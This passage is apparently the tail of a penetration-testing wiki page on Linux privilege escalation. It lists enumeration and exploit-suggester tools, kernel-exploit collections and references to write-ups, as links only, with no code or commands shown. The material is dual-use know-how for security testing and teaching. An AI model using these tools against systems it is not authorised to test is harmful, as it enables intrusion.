- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
